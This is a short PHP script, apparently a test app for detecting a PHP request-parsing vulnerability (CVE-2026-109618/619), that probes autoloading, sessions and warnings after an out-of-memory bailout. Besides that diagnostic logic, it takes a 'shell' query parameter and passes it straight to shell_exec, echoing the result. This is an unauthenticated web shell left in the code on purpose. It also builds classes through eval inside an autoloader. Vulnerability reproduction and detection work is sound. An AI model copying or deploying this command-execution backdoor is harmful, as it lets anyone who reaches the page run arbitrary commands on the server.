<?php
// CVE-2026-109618/619 detector app. Vendor regression shape from
// sapi/cli/tests/oom_request_parsing_next_request.phpt: the autoload/
// class-entry machinery is the canary for request-parsing state that an
// OOM bailout leaked into THIS request from the previous one.
error_reporting(E_ALL);
ini_set('display_errors', '1');

$shell = isset($_GET['shell']) ? (string)$_GET['shell'] : null;
@session_start(); // 619 consumer surface: session machinery on a stale-worker-global read

ob_start();
$cls = null; $err = null;
try {
    spl_autoload_register(function ($class) { eval("class $class {}"); });
    $cls = get_class(new Foo);
} catch (Throwable $e) { $err = get_class($e) . ':' . $e->getMessage(); }
trigger_error("Bar", E_USER_WARNING);
$out = ob_get_clean();

echo "CLASS=" . ($cls ?? ('throwable:' . $err)) . "\n";
echo $out;
if ($shell !== null) {
    echo "SHELL=" . preg_replace('/\s+/', ' ', (string)shell_exec($shell)) . "\n";
}
